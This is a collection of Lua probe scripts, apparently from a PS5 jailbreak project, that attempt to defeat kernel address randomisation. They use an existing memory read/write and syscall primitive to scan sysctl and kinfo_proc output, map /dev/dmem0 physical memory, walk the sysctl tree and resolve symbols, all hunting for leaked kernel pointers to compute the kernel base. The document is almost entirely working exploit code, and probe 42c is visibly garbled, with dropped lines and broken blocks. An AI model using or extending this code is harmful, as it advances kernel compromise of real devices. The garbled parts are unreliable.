## probes/phase9_kaslr_defeat/42b_kaslr_defeat.lua

```lua
-- CRASH_CLASS: RISKY (ropchain manipulation for KASLR defeat)
-- PROBE 42b: bypass kinfo_proc sanitization to leak kernel base
--
-- Multi-approach KASLR defeat:
--   A) Dense kinfo_proc scan (42a only sampled every 64 bytes)
--   B) kldsym (syscall 337) — directly resolves kernel symbols
--   C) kldstat (syscall 306) — kernel module base addresses
--   D) sysctl debug/security MIBs that may leak addresses
--   E) Ropchain: overwrite fn_addr to call sceKernelGetModuleInfo-like
--      functions that return unsanitized kernel addresses
--   F) Read FS/GS base via ropchain (thread-local has kernel ptrs)

print("=== PROBE 42b: KASLR DEFEAT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%X%08X", v.h, v.l), v.h, v.l
    end
    local n = to_num(v)
    return string.format("0x%X", n), 0, n
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_getpid = make_syscall(20)
local sc_sysctl = make_syscall(202)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(588)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

local kptrs_found = {}
local function record_kptr(source, off, h, l)
    kptrs_found[#kptrs_found + 1] = {
        src = source, off = off, h = h, l = l
    }
end

--------------------------------------------------------------------
-- A) Dense kinfo_proc scan — every qword
--------------------------------------------------------------------
print("")
print("=== A: DENSE KINFO_PROC ===")
do
    local mib = memory.alloc(16)
    safe_wd(mib, 1)      -- CTL_KERN
    safe_wd(mib + 4, 14)  -- KERN_PROC
    safe_wd(mib + 8, 1)   -- KERN_PROC_PID
    safe_wd(mib + 12, pid)

    local outbuf = memory.alloc(0x1000)
    for off = 0, 0xFF, 4 do safe_wd(outbuf + off, 0) end
    local oldlenp = memory.alloc(8)
    safe_wd(oldlenp, 0x1000)

    local ok, ret = pcall(function()
        return sc_sysctl(uint64(mib), uint64(4), uint64(outbuf),
            uint64(oldlenp), uint64(0), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999
    local actual_len = safe_rd(oldlenp) or 0
    print("ret=" .. rv .. " len=" .. actual_len)

    if rv == 0 and actual_len > 0 then
        local found = 0
        for off = 0, actual_len - 8, 8 do
            local q = safe_rq(outbuf + off)
            if q then
                local h, l = get_hi_lo(q)
                -- kernel ptrs: 0xFFFF8xxx or higher
                if h >= 0xFFFF8000 then
                    print(string.format("  +%03X: %08X_%08X KPTR!", off, h, l))
                    record_kptr("kinfo", off, h, l)
                    found = found + 1
                -- also check for addresses in 0x8xxxxxxx_xxxxxxxx range
                -- (kernel text on some configurations)
                elseif h >= 0x80000000 and h < 0xFFFF0000 and l ~= 0 then
                    print(string.format("  +%03X: %08X_%08X HIGH?", off, h, l))
                    found = found + 1
                end
            end
        end
        if found == 0 then
            print("  no kernel pointers (all sanitized)")
        end
    end
end

-- B) kldsym SKIPPED — crashes the loader (hard fault on syscall 337)

-- C) kldstat SKIPPED — crashes the loader (hard fault on syscall 306)

--------------------------------------------------------------------
-- D) Obscure sysctl MIBs
--------------------------------------------------------------------
print("")
print("=== D: OBSCURE SYSCTL MIBS ===")
do
    local function try_sysctl_raw(label, mib_vals, sz)
        sz = sz or 0x200
        local mib = memory.alloc(#mib_vals * 4)
        for i, v in ipairs(mib_vals) do safe_wd(mib + (i-1)*4, v) end
        local out = memory.alloc(sz)
        for off = 0, math.min(sz-1, 0xFF), 4 do safe_wd(out + off, 0) end
        local lenp = memory.alloc(8)
        safe_wd(lenp, sz)
        local ok, ret = pcall(function()
            return sc_sysctl(uint64(mib), uint64(#mib_vals),
                uint64(out), uint64(lenp), uint64(0), uint64(0))
        end)
        local rv = ok and to_num(ret) or -999
        local alen = safe_rd(lenp) or 0
        if rv ~= 0 then
            print(string.format("  %s: ret=%d", label, rv))
            return
        end
        -- scan for kernel ptrs
        local found_k = false
        for off = 0, math.min(alen - 1, sz - 8), 8 do
            local q = safe_rq(out + off)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 then
                    print(string.format("  %s +%03X: %08X_%08X KPTR!", label, off, h, l))
                    record_kptr("sysctl:" .. label, off, h, l)
                    found_k = true
                end
            end
        end
        if not found_k then
            -- print value if small
            if alen <= 8 then
                local q = safe_rq(out)
                print(string.format("  %s: len=%d val=%s", label, alen, q and qw_hex(q) or "?"))
            else
                print(string.format("  %s: len=%d (no kptrs)", label, alen))
            end
        end
    end

    -- security.jail.jailed
    try_sysctl_raw("security.jail.jailed", {14, 5, 1}, 8)
    -- kern.features
    try_sysctl_raw("kern.features", {1, 36}, 0x200)
    -- kern.proc.args (might leak stack addrs)
    try_sysctl_raw("kern.proc.args." .. pid, {1, 14, 7, pid}, 0x400)
    -- kern.proc.env
    try_sysctl_raw("kern.proc.env." .. pid, {1, 14, 35, pid}, 0x400)
    -- kern.proc.auxv (ELF aux vectors have base addresses)
    try_sysctl_raw("kern.proc.auxv", {1, 14, 36, pid}, 0x400)
    -- kern.proc.groups
    try_sysctl_raw("kern.proc.groups", {1, 14, 2, pid}, 0x100)
    -- kern.proc.rlimit
    try_sysctl_raw("kern.proc.rlimit", {1, 14, 37, pid}, 0x200)
    -- kern.msgbuf (kernel message buffer — might have addresses in text)
    try_sysctl_raw("kern.msgbuf", {1, 33}, 0x1000)
    -- kern.conftxt (kernel config text)
    try_sysctl_raw("kern.conftxt", {1, 34}, 0x1000)
    -- vm.loadavg
    try_sysctl_raw("vm.loadavg", {2, 2}, 0x20)
    -- vm.vmtotal
    try_sysctl_raw("vm.vmtotal", {2, 5}, 0x100)
    -- kern.timecounter.tc.TSC.frequency (might be useful)
    try_sysctl_raw("kern.boottime", {1, 21}, 0x10)
end

--------------------------------------------------------------------
-- E) dynlib_get_info for all loaded modules — PRX base addresses
--------------------------------------------------------------------
print("")
print("=== E: DYNLIB MODULE BASES ===")
do
    local sc_dynlib_get_list = make_syscall(592)
    local sc_dynlib_get_info = make_syscall(593)

    local handles = memory.alloc(1024)
    local num_buf = memory.alloc(8)
    pcall(function() sc_dynlib_get_list(handles, 128, num_buf) end)
    local num = safe_rd(num_buf) or 0
    print("loaded modules: " .. num)

    for i = 0, math.min(num - 1, 15) do
        local handle = safe_rd(handles + i * 4)
        if handle and handle ~= 0 then
            local info = memory.alloc(0x200)
            for off = 0, 0x1F8, 4 do safe_wd(info + off, 0) end
            safe_wd(info, 0x160)  -- size field

            local ok_i = pcall(function()
                sc_dynlib_get_info(uint64(handle), info)
            end)

            if ok_i then
                -- name at +8 (256 bytes)
                local name = ""
                for j = 0, 31 do
                    local b = safe_rd(info + 8 + j)
                    if b then
                        b = b % 256
                        if b >= 0x20 and b < 0x7F then name = name .. string.char(b)
                        elseif b == 0 then break end
                    end
                end

                -- text segment at +0x108
                local txt_q = safe_rq(info + 0x108)
                local txt_sz = safe_rq(info + 0x110)
                -- data segment at +0x118
                local dat_q = safe_rq(info + 0x118)

                local txt_str = txt_q and qw_hex(txt_q) or "?"
                local dat_str = dat_q and qw_hex(dat_q) or "?"

                print(string.format("  [%d] h=%d %s text=%s data=%s",
                    i, handle, name, txt_str, dat_str))

                -- check if any segment addresses are kernel-range
                if txt_q then
                    local h, l = get_hi_lo(txt_q)
                    if h >= 0xFFFF8000 then
                        record_kptr("dynlib:" .. name, 0x108, h, l)
                        print("    *** KERNEL ADDRESS IN MODULE INFO ***")
                    end
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- F) Ropchain-based: read from thread control block
-- The FS segment base contains per-thread kernel data
-- We can use the rdfsbase instruction via a gadget, or
-- use the arch_prctl equivalent (sysarch syscall 165)
--------------------------------------------------------------------
print("")
print("=== F: THREAD CONTROL BLOCK ===")
do
    -- sysarch(AMD64_GET_FSBASE=128, &addr) or (AMD64_GET_GSBASE=129, &addr)
    local sc_sysarch = make_syscall(165)
    local addr_buf = memory.alloc(16)

    -- try FSBASE
    safe_wd(addr_buf, 0)
    safe_wd(addr_buf + 4, 0)
    local ok_fs, ret_fs = pcall(function()
        return sc_sysarch(uint64(128), uint64(addr_buf))
    end)
    local fs_rv = ok_fs and to_num(ret_fs) or -999
    local fs_q = safe_rq(addr_buf)
    print(string.format("  sysarch(GET_FSBASE): ret=%d val=%s", fs_rv,
        fs_q and qw_hex(fs_q) or "?"))

    if fs_rv == 0 and fs_q then
        local fsh, fsl = get_hi_lo(fs_q)
        if fsh >= 0xFFFF8000 then
            print("  *** FS BASE IS A KERNEL ADDRESS ***")
            record_kptr("fsbase", 0, fsh, fsl)
        elseif fsh > 0 or fsl > 0x10000 then
            -- it's a userspace address — read what it points to
            print("  FS base is userspace, reading TCB:")
            for off = 0, 0x78, 8 do
                local q = safe_rq(uint64(fsh * 0x100000000 + fsl + off))
                if q then
                    local h, l = get_hi_lo(q)
                    local tag = ""
                    if h >= 0xFFFF8000 then
                        tag = " KPTR!"
                        record_kptr("tcb", off, h, l)
                    end
                    if h ~= 0 or l ~= 0 then
                        print(string.format("    +%02X: %08X_%08X%s", off, h, l, tag))
                    end
                end
            end
        end
    end

    -- try GSBASE
    safe_wd(addr_buf, 0)
    safe_wd(addr_buf + 4, 0)
    local ok_gs, ret_gs = pcall(function()
        return sc_sysarch(uint64(129), uint64(addr_buf))
    end)
    local gs_rv = ok_gs and to_num(ret_gs) or -999
    local gs_q = safe_rq(addr_buf)
    print(string.format("  sysarch(GET_GSBASE): ret=%d val=%s", gs_rv,
        gs_q and qw_hex(gs_q) or "?"))
end

--------------------------------------------------------------------
-- SUMMARY
--------------------------------------------------------------------
print("")
print("=== KASLR DEFEAT SUMMARY ===")
print("kernel pointers found: " .. #kptrs_found)
for _, kp in ipairs(kptrs_found) do
    print(string.format("  [%s +%03X] %08X_%08X", kp.src, kp.off, kp.h, kp.l))
end

if #kptrs_found > 0 then
    -- try to compute kernel base (typically 0xFFFFFFFF8xxxxxxx aligned to 2MB)
    local best = kptrs_found[1]
    local kbase_h = best.h
    local kbase_l = best.l - (best.l % 0x200000)  -- align down to 2MB
    print(string.format("  estimated kernel base: %08X_%08X", kbase_h, kbase_l))
    print("  *** KASLR DEFEATED — kernel base leaked ***")
else
    print("  no kernel pointers leaked")
    print("  next: use ropchain to directly call kernel-resolving functions")
end

print("")
print("=== PROBE 42b COMPLETE ===")
```

```lua
-- CRASH_CLASS: SAFE (read-only enumeration, no dangerous syscalls)
-- PROBE 42c: Deep KASLR defeat — full struct dumps

--   libkernel.sprx at 0x82D4B0000

    return tonumber(v) or 0

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_sysctl = make_syscall(202)
local sc_pipe = make_syscall(42)

    end)

                    if h >= 0x80000000 and h < 0xFFFF0000 then tag = " HIGH?" end

                    end

do
    local function try_sysctl(label, mib_vals, sz)
        sz = sz or 0x100
        local mib = memory.alloc(#mib_vals * 4)
        for i, v in ipairs(mib_vals) do safe_wd(mib+(i-1)*4, v) end
        local out = memory.alloc(sz)

        end)

        if rv ~= 0 then
            print(string.format("  %s: ret=%d", label, rv))
            return

        for off = 0, math.min(alen-1, sz-8), 8 do
            local q = safe_rq(out+off)
            if q then

                    print(string.format("  %s +%03X: %08X_%08X KPTR!", label, off, h, l))
                    kptrs[#kptrs+1] = {src="sysctl:"..label, off=off, h=h, l=l}

    try_sysctl("security.bsd.unprivileged_read_msgbuf", {14, 1, 3}, 4)

    try_sysctl("net.inet.tcp.mssdflt", {4, 2, 6, 4}, 4)
    -- kern.smp.cpus name2oid then read
    -- try direct: kern.smp = {1, 12}?
    try_sysctl("kern.smp.active", {1, 12, 1}, 4)
    try_sysctl("kern.smp.cpus", {1, 12, 2}, 4)
```

```lua
-- CRASH_CLASS: RISKY (dmem0 mmap + ioctl for physical memory access)
-- PROBE 42d: KASLR defeat via /dev/dmem0 and filedesc sysctl
--
-- From 42c: /dev/dmem0 opens (fd=24). This is the direct memory
-- allocation device. We may be able to mmap physical memory
-- containing kernel data structures or text.
--
-- Also tries: kern.proc.filedesc sysctl (returns fd table with
-- kernel vnode pointers) and stack-region scanning.

print("=== PROBE 42d: DMEM KASLR ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_getpid = make_syscall(20)
local sc_sysctl = make_syscall(202)
local sc_open = make_syscall(5)
local sc_close = make_syscall(6)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(588)
local sc_ioctl = make_syscall(54)
local sc_read = make_syscall(3)
local sc_fstat = make_syscall(189)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

local kptrs = {}

--------------------------------------------------------------------
-- A) Open /dev/dmem0 and try to mmap physical memory
--------------------------------------------------------------------
print("")
print("=== A: DMEM0 PHYSICAL MEMORY ===")
do
    local path = memory.alloc(32)
    local s = "/dev/dmem0"
    for i = 1, #s do memory.write_byte(path+(i-1), string.byte(s, i)) end
    memory.write_byte(path + #s, 0)

    local ok_o, fd = pcall(function()
        return sc_open(uint64(path), uint64(2), uint64(0))  -- O_RDWR=2
    end)
    local dmem_fd = ok_o and to_num(fd) or -1
    print("dmem0 fd: " .. dmem_fd)

    if dmem_fd >= 0 then
        -- Try to query dmem via ioctl
        -- On PS5, dmem ioctl codes:
        --   DMEM_TOTAL = 0x4008800A (get total size)
        --   DMEM_AVAIL = 0x4008800B (get available)
        local ioctl_buf = memory.alloc(64)
        for i = 0, 56, 4 do safe_wd(ioctl_buf+i, 0) end

        -- Try DMEM_TOTAL
        local ok_i, iret = pcall(function()
            return sc_ioctl(uint64(dmem_fd), uint64(0x4008800A), uint64(ioctl_buf))
        end)
        local irv = ok_i and to_num(iret) or -999
        print(string.format("  ioctl DMEM_TOTAL: ret=%d", irv))
        if irv == 0 then
            local q = safe_rq(ioctl_buf)
            if q then
                local h, l = get_hi_lo(q)
                print(string.format("    total: %08X_%08X (%d MB)", h, l, l / 1048576))
            end
        end

        -- Try DMEM_AVAIL
        for i = 0, 56, 4 do safe_wd(ioctl_buf+i, 0) end
        ok_i, iret = pcall(function()
            return sc_ioctl(uint64(dmem_fd), uint64(0x4008800B), uint64(ioctl_buf))
        end)
        irv = ok_i and to_num(iret) or -999
        print(string.format("  ioctl DMEM_AVAIL: ret=%d", irv))
        if irv == 0 then
            local q = safe_rq(ioctl_buf)
            if q then
                local h, l = get_hi_lo(q)
                print(string.format("    avail: %08X_%08X (%d MB)", h, l, l / 1048576))
            end
        end

        -- Try to allocate direct memory
        -- sceKernelAllocateDirectMemory(searchStart, searchEnd, len, alignment, memoryType, &physAddrOut)
        -- This is syscall 572
        local sc_alloc_dm = make_syscall(572)
        local phys_out = memory.alloc(8)
        safe_wq(phys_out, uint64(0))

        local ok_a, aret = pcall(function()
            return sc_alloc_dm(
                uint64(0),              -- searchStart
                uint64(0x40000000),     -- searchEnd (1GB)
                uint64(0x4000),         -- len (1 page = 16KB)
                uint64(0x4000),         -- alignment
                uint64(0),              -- memoryType (WB_ONION)
                uint64(phys_out)        -- out physical addr
            )
        end)
        local arv = ok_a and to_num(aret) or -999
        print(string.format("  allocate_direct_memory: ret=%d", arv))
        if arv == 0 then
            local phys = safe_rq(phys_out)
            if phys then
                local ph, pl = get_hi_lo(phys)
                print(string.format("    physical addr: %08X_%08X", ph, pl))

                -- Now mmap this physical page to see if we can read it
                local ok_m, maddr = pcall(function()
                    return sc_mmap(
                        uint64(0),              -- addr hint
                        uint64(0x4000),         -- len
                        uint64(3),              -- PROT_READ|PROT_WRITE
                        uint64(0x10),           -- MAP_SHARED
                        uint64(dmem_fd),        -- fd
                        uint64(phys)            -- offset = physical addr
                    )
                end)
                local mrv = ok_m and maddr or nil
                if mrv then
                    local mh, ml = get_hi_lo(mrv)
                    print(string.format("    mmap at: %08X_%08X", mh, ml))
                    -- Read first qwords
                    for off = 0, 0x38, 8 do
                        local q = safe_rq(mrv + off)
                        if q then
                            local qh, ql = get_hi_lo(q)
                            if qh ~= 0 or ql ~= 0 then
                                print(string.format("      +%02X: %08X_%08X", off, qh, ql))
                            end
                        end
                    end
                    pcall(function() sc_munmap(mrv, uint64(0x4000)) end)
                else
                    print("    mmap failed")
                end

                -- Free the direct memory
                local sc_free_dm = make_syscall(573)
                pcall(function() sc_free_dm(uint64(phys), uint64(0x4000)) end)
            end
        end

        -- Try mmap at specific physical offsets where kernel might live
        -- On x86-64, kernel is typically loaded at physical 0x100000 (1MB) or higher
        -- Try mapping physical address 0 (first page) and 0x100000
        local phys_targets = {0x0, 0x1000, 0x100000, 0x200000, 0x1000000}
        for _, phys_off in ipairs(phys_targets) do
            local ok_m2, maddr2 = pcall(function()
                return sc_mmap(
                    uint64(0), uint64(0x4000), uint64(1),  -- PROT_READ
                    uint64(0x10),  -- MAP_SHARED
                    uint64(dmem_fd), uint64(phys_off)
                )
            end)
            local m2rv = ok_m2 and to_num(maddr2) or -1
            local tag = "fail"
            if m2rv > 0 and m2rv < 0xFFFFFFFF then
                tag = "OK"
                -- read first qword
                local q = safe_rq(maddr2)
                if q then
                    local qh, ql = get_hi_lo(q)
                    tag = string.format("OK val=%08X_%08X", qh, ql)
                    if qh >= 0xFFFF8000 then
                        kptrs[#kptrs+1] = {src="dmem_phys", off=phys_off, h=qh, l=ql}
                        tag = tag .. " KPTR!"
                    end
                end
                pcall(function() sc_munmap(maddr2, uint64(0x4000)) end)
            end
            print(string.format("  mmap phys 0x%X: %s", phys_off, tag))
        end

        pcall(function() sc_close(uint64(dmem_fd)) end)
    end
end

--------------------------------------------------------------------
-- B) kern.proc.filedesc — fd table with kernel vnode pointers
--------------------------------------------------------------------
print("")
print("=== B: FILEDESC SYSCTL ===")
do
    local mib = memory.alloc(16)
    safe_wd(mib, 1); safe_wd(mib+4, 14); safe_wd(mib+8, 14); safe_wd(mib+12, pid)
    local out = memory.alloc(0x2000)
    for i = 0, 0xFF, 4 do safe_wd(out+i, 0) end
    local lenp = memory.alloc(8)
    safe_wd(lenp, 0x2000)
    local ok, ret = pcall(function()
        return sc_sysctl(uint64(mib), uint64(4), uint64(out), uint64(lenp), uint64(0), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999
    local alen = safe_rd(lenp) or 0
    print(string.format("  kern.proc.filedesc: ret=%d len=%d", rv, alen))

    if rv == 0 and alen > 0 then
        local found = 0
        for off = 0, math.min(alen-8, 0x1FF8), 8 do
            local q = safe_rq(out+off)
            if q then

                if h >= 0xFFFF8000 then
                    print(string.format("    +%03X: %08X_%08X KPTR!", off, h, l))
                    kptrs[#kptrs+1] = {src="filedesc", off=off, h=h, l=l}
                    found = found + 1
                    if found >= 10 then print("    ... (capped)"); break end
                end
            end
        end
        if found == 0 then
            -- show first few non-zero entries
            local shown = 0
            for off = 0, math.min(alen-8, 0x1FF8), 8 do
                local q = safe_rq(out+off)
                if q then
                    local h, l = get_hi_lo(q)
                    if (h ~= 0 or l ~= 0) and shown < 8 then
                        print(string.format("    +%03X: %08X_%08X", off, h, l))
                        shown = shown + 1
                    end
                end
            end
        end
    end
end
```

## probes/phase9_kaslr_defeat/42e_sysctl_enum.lua

```lua
-- CRASH_CLASS: SAFE (read-only sysctl enumeration)
-- PROBE 42e: Enumerate ALL available sysctls via meta-interface
--
-- FreeBSD sysctl meta-interface:
--   {0, 1, <oid...>} = get next OID in tree
--   {0, 2, <oid...>} = get name of OID
--   {0, 4, <oid...>} = get format string of OID
--
-- Strategy: walk the entire sysctl tree, try to read each one,
-- and check for kernel addresses in any that return data.

print("=== PROBE 42e: SYSCTL ENUMERATION ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_sysctl = make_syscall(202)
local sc_getpid = make_syscall(20)
local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

-- Buffers
local mib_buf = memory.alloc(64)
local next_buf = memory.alloc(64)
local name_buf = memory.alloc(256)
local val_buf = memory.alloc(0x200)
local len_buf = memory.alloc(8)

local kptrs = {}
local readable_count = 0
local total_found = 0

-- Get next OID: sysctl({0, 1, <current_oid>}, len+2, next_oid, &next_len, NULL, 0)
local function get_next_oid(current_oid, current_len)
    -- Build query MIB: {0, 1, current_oid[0], current_oid[1], ...}
    safe_wd(mib_buf, 0)
    safe_wd(mib_buf + 4, 1)
    for i = 0, current_len - 1 do
        safe_wd(mib_buf + 8 + i * 4, current_oid[i + 1])
    end

    -- Output: next OID
    safe_wd(len_buf, 64)
    local ok, ret = pcall(function()
        return sc_sysctl(uint64(mib_buf), uint64(current_len + 2),
            uint64(next_buf), uint64(len_buf), uint64(0), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999
    if rv ~= 0 then return nil end

    local out_len = safe_rd(len_buf) or 0
    local oid_count = math.floor(out_len / 4)
    if oid_count <= 0 then return nil end

    local result = {}
    for i = 0, oid_count - 1 do
        result[i + 1] = safe_rd(next_buf + i * 4) or 0
    end
    return result
end

-- Get name of OID: sysctl({0, 2, oid...}, len+2, name_out, &name_len, NULL, 0)
local function get_oid_name(oid)
    safe_wd(mib_buf, 0)
    safe_wd(mib_buf + 4, 2)
    for i = 1, #oid do
        safe_wd(mib_buf + 4 + i * 4, oid[i])
    end

    safe_wd(len_buf, 256)
    local ok, ret = pcall(function()
        return sc_sysctl(uint64(mib_buf), uint64(#oid + 2),
            uint64(name_buf), uint64(len_buf), uint64(0), uint64(0))
    end)
    if not ok or to_num(ret) ~= 0 then return nil end

    local nlen = safe_rd(len_buf) or 0
    if nlen <= 0 then return nil end

    local name = ""
    for i = 0, math.min(nlen - 1, 127) do
        local b = safe_rd(name_buf + i)
        if b then
            b = b % 256
            if b == 0 then break end
            if b >= 0x20 and b < 0x7F then name = name .. string.char(b) end
        end
    end
    return name
end

-- Try to read the value of an OID and check for kernel pointers
local function try_read_oid(oid, name)
    for i = 0, 0x1F, 4 do safe_wd(val_buf + i, 0) end
    safe_wd(len_buf, 0x200)

    -- Build the MIB
    local qmib = memory.alloc(#oid * 4)
    for i = 1, #oid do safe_wd(qmib + (i-1) * 4, oid[i]) end

    local ok, ret = pcall(function()
        return sc_sysctl(uint64(qmib), uint64(#oid),
            uint64(val_buf), uint64(len_buf), uint64(0), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999
    if rv ~= 0 then return false end

    local vlen = safe_rd(len_buf) or 0
    if vlen <= 0 then return false end

    readable_count = readable_count + 1

    -- Scan for kernel pointers
    local found = false
    for off = 0, math.min(vlen - 8, 0x1F8), 8 do
        local q = safe_rq(val_buf + off)
        if q then
            local h, l = get_hi_lo(q)
            if h >= 0xFFFF8000 then
                print(string.format("  *** %s +%03X: %08X_%08X KPTR!", name, off, h, l))
                kptrs[#kptrs + 1] = {src = name, off = off, h = h, l = l}
                found = true
            end
        end
    end

    return found
end

--------------------------------------------------------------------
-- Walk the sysctl tree
--------------------------------------------------------------------
print("Walking sysctl tree...")
print("")

local current = {1}  -- start from CTL_KERN (1)
local max_iter = 500
local iter = 0

-- Keep track to print interesting readable ones
local readable_names = {}

while iter < max_iter do
    iter = iter + 1

    local name = get_oid_name(current)
    if name then
        total_found = total_found + 1
        local had_kptr = try_read_oid(current, name)
        if had_kptr then
            -- already printed
        end
        -- Track readable names (just record, print summary at end)
        if readable_count > #readable_names then
            readable_names[#readable_names + 1] = name
        end
    end

    -- Get next OID
    local next_oid = get_next_oid(current, #current)
    if not next_oid then break end

    -- Safety: don't go past top-level 20
    if next_oid[1] and next_oid[1] > 20 then break end

    current = next_oid
end

print("")
print("=== ENUMERATION RESULTS ===")
print(string.format("OIDs found: %d", total_found))
print(string.format("Readable: %d", readable_count))
print(string.format("Kernel pointers: %d", #kptrs))

if #kptrs > 0 then
    print("")
    print("*** KERNEL POINTERS FOUND ***")
    for _, kp in ipairs(kptrs) do
        print(string.format("  [%s +%03X] %08X_%08X", kp.src, kp.off, kp.h, kp.l))
    end
end

-- Print all readable sysctl names
print("")
print("Readable sysctls:")
for _, n in ipairs(readable_names) do
    print("  " .. n)
end

print("")
print("=== PROBE 42e COMPLETE ===")
```

```lua
-- CRASH_CLASS: MODERATE (probing unknown syscalls)
-- PROBE 42f: PS5-specific syscalls for KASLR defeat
--
-- Try PS5 custom syscalls that might leak kernel addresses:
--   594: sceKernelDlsym (resolve symbol from module)
--   598: sceKernelGetModuleList (alt module list)
--   596/597: event flags
--   600: sceKernelGetAppInfo or similar
--   Various info syscalls in 600-650 range

print("=== PROBE 42f: PS5 SYSCALL SCAN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc_getpid = make_syscall(20)
local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

local kptrs = {}

--------------------------------------------------------------------
-- A) sceKernelDlsym (594) — resolve symbol from a module
-- signature: dlsym(handle, symbol_name, &addr_out)
--------------------------------------------------------------------
print("")
print("=== A: DLSYM (594) ===")
do
    local sc_dlsym = make_syscall(594)
    local sym_name = memory.alloc(64)
    local addr_out = memory.alloc(8)

    -- Try resolving symbols from libkernel (handle 8193 or 0x2001)
    -- and from handle 0 (default/global)
    local symbols = {
        "sceKernelGetCurrentCpu",
        "sceKernelGetProcessTime",
        "sceKernelGetDirectMemorySize",
        "sceKernelMapDirectMemory",
        "sceKernelSendNotificationRequest",
        "sceKernelDebugOutText",
        "__error",
        "sceKernelGetProcParam",
    }

    local handles = {0x2001, 0}
    for _, handle in ipairs(handles) do
        local label = handle == 0x2001 and "libkernel" or "global"
        for _, sym in ipairs(symbols) do
            for i = 1, #sym do memory.write_byte(sym_name+(i-1), string.byte(sym, i)) end
            memory.write_byte(sym_name + #sym, 0)
            safe_wq(addr_out, uint64(0))

            local ok, ret = pcall(function()
                return sc_dlsym(uint64(handle), uint64(sym_name), uint64(addr_out))
            end)
            local rv = ok and to_num(ret) or -999
            if rv == 0 then
                local addr = safe_rq(addr_out)
                if addr then
                    local h, l = get_hi_lo(addr)
                    local tag = ""
                    if h >= 0xFFFF8000 then
                        tag = " *** KERNEL ***"
                        kptrs[#kptrs+1] = {src="dlsym:"..sym, off=0, h=h, l=l}
                    end
                    print(string.format("  [%s] %s = %08X_%08X%s", label, sym, h, l, tag))
                end
            end
        end
    end
end

--------------------------------------------------------------------
-- B) Call resolved functions via ropchain to get kernel info
-- Use the existing ropchain to call functions we resolved
